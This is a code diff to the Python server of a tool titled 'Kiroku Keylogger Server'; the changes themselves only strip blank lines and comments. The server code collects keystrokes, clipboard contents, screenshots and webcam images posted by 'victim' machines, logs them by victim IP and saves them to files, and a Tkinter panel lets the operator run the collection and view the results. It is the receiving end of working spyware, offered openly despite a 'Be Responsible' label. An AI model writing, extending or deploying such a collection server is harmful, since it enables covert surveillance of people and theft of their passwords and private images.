@@ -33,24 +33,20 @@ server = None
 # Configure logging
 logger = logging.getLogger()
 logger.setLevel(logging.INFO)
-
 # File paths and directories
 keystrokes_file_path = 'saved_keystrokes.txt'
 clipboard_file_path = 'saved_clipboard.txt'
 screenshots_dir = 'screenshots'
 camera_images_dir = 'camera_images'
 connected_ips_file_path = 'connected_ips.txt'
-
 os.makedirs(screenshots_dir, exist_ok=True)
 os.makedirs(camera_images_dir, exist_ok=True)
-
 # Flag for logging clipboard data, screenshot data, and camera images
 show_clipboard_in_logs = True
 show_screenshot_logs = True
 show_camera_logs = True
-
 connected_ips = set()
-data_received = 0  # Track the amount of data received
+data_received = 0
 
 class GUIHandler(logging.Handler):
     def __init__(self, log_widget):
@@ -80,45 +76,34 @@ def handle_post():
     try:
         post_data = request.data.decode('utf-8')
         data = json.loads(post_data)
-
         keyboard_data = data.get('keyboardData', '')
         clipboard_data = data.get('clipboardData', '')
         screenshot_base64 = data.get('screenshot', '')
         camera_image_base64 = data.get('cameraImage', '')
-
         victim_ip = request.remote_addr
-
         if victim_ip not in connected_ips:
             logger.info(f"{victim_ip} connected")
             connected_ips.add(victim_ip)
-
         if keyboard_data:
             logger.info(f"Received Keystrokes from {victim_ip}: {keyboard_data}")
             save_to_file(keystrokes_file_path, f"{victim_ip}: {keyboard_data}")
-
         if clipboard_data:
             save_to_file(clipboard_file_path, f"{victim_ip}: {clipboard_data}")
             if show_clipboard_in_logs:
                 logger.info(f"Received Clipboard Data from {victim_ip}: {clipboard_data}")
-
         if screenshot_base64:
             save_screenshot(screenshot_base64, victim_ip)
             if show_screenshot_logs:
                 logger.info(f"Screenshot saved from {victim_ip}")
-
         if camera_image_base64:
             save_camera_image(camera_image_base64, victim_ip)
             if show_camera_logs:
                 logger.info(f"Camera image saved from {victim_ip}")
-
-        data_received += len(post_data)  # Update the total data received
-
+        data_received += len(post_data)
         return jsonify({'status': 'success', 'message': 'Data received and saved successfully'}), 200
-
     except json.JSONDecodeError as e:
         logger.error(f"JSON parsing error: {e}")
         return jsonify({'status': 'error', 'message': 'Invalid JSON'}), 400
-
     except Exception as e:
         logger.error(f"Server error: {e}")
         return jsonify({'status': 'error', 'message': 'Internal server error'}), 500
@@ -171,77 +156,57 @@ class ServerGUI:
         root.title("Kiroku Keylogger Server (Be Responsible - Kuraiyume)")
         root.geometry("900x700") 
         self.center_window(900, 700)
-
         self.notebook = ttk.Notebook(root)
         self.notebook.pack(fill='both', expand=True)
-
         self.log_frame = ttk.Frame(self.notebook)
         self.notebook.add(self.log_frame, text="Logs")
-
         self.log_text = scrolledtext.ScrolledText(self.log_frame, width=100, height=30, wrap=tk.WORD, bg='black', fg='white')
         self.log_text.pack(padx=10, pady=10, fill='both', expand=True)
         self.log_text.tag_configure("INFO", foreground="white")
         self.log_text.tag_configure("WARNING", foreground="orange")
         self.log_text.tag_configure("ERROR", foreground="red")
-
         self.gui_handler = GUIHandler(self.log_text)
         self.gui_handler.addFilter(FilterFlaskLogs())
         logger.addHandler(self.gui_handler)
-
         for handler in logger.handlers[:]:
             if isinstance(handler, logging.StreamHandler):
                 logger.removeHandler(handler)
-
         self.control_frame = ttk.Frame(self.notebook)
         self.notebook.add(self.control_frame, text="Control")
-
         self.start_button = ttk.Button(self.control_frame, text="Start Server", command=self.start_server)
         self.start_button.pack(pady=10)
-
         self.stop_button = ttk.Button(self.control_frame, text="Stop Server", command=self.stop_server, state=tk.DISABLED)
         self.stop_button.pack(pady=10)
-
         self.save_logs_button = ttk.Button(self.control_frame, text="Save Logs", command=self.save_logs)
         self.save_logs_button.pack(pady=10)
-
         self.clear_logs_button = ttk.Button(self.control_frame, text="Clear Logs", command=self.clear_logs)
         self.clear_logs_button.pack(pady=10)
-
         self.quit_button = ttk.Button(self.control_frame, text="Quit", command=self.quit_application)
         self.quit_button.pack(pady=10)
-
         self.clipboard_check = ttk.Checkbutton(self.control_frame, text="Show Clipboard in Logs", command=self.toggle_clipboard_logging)
         self.clipboard_check.pack(pady=10)
         self.clipboard_check.state(['selected'] if show_clipboard_in_logs else ['!selected'])
-
         self.screenshot_check = ttk.Checkbutton(self.control_frame, text="Show Screenshot Logs", command=self.toggle_screenshot_logging)
         self.screenshot_check.pack(pady=10)
         self.screenshot_check.state(['selected'] if show_screenshot_logs else ['!selected'])
-
         self.camera_check = ttk.Checkbutton(self.control_frame, text="Show Camera Logs", command=self.toggle_camera_logging)
         self.camera_check.pack(pady=10)
         self.camera_check.state(['selected'] if show_camera_logs else ['!selected'])
-
         ttk.Label(self.control_frame, text="Theme:").pack(pady=5)
         self.theme_combo = ttk.Combobox(self.control_frame, values=["Light", "Dark"], state="readonly")
         self.theme_combo.current(1)
         self.theme_combo.pack(pady=5)
         self.theme_combo.bind("<<ComboboxSelected>>", self.change_theme)
-
         ttk.Label(self.control_frame, text="Font Size:").pack(pady=5)
         self.font_size_spinbox = tk.Spinbox(self.control_frame, from_=8, to=30)
         self.font_size_spinbox.pack(pady=5)
         self.font_size_spinbox.bind("<Return>", self.change_font_size)
-
         self.status_label = ttk.Label(self.control_frame, text="Status: Server not running")
         self.status_label.pack(pady=10)
-
         self.stats_label = ttk.Label(self.control_frame, text="Connected Clients: 0, Data Received: 0 bytes")
         self.stats_label.pack(pady=10)
-
         self.server_thread = None
         self.server_running = False
-
         self.notebook.select(self.control_frame)
 
     def start_server(self):
